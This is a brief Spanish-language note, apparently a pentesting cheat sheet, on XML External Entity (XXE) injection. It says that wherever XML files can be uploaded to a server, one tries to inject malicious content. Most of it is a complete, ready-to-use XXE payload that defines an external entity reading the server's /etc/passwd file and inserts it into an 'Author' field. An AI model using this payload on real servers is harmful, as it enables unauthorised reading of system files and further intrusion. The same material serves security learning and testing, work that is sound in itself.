XXE (XML External Entity Injection)


Cuando podamos subir archivos XML a un servidor intentaremos comprobar si podemos injectarle codigo malicioso

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<elements>
<Author>&xxe;</Author>
<Subject>test</Subject>
<Content>test</Content>
</elements>


En el ejemplo anterior indicamos la estructura que nos pide el servidor que tenga nuestro XML y le injectamos codigo en el campo “Author”
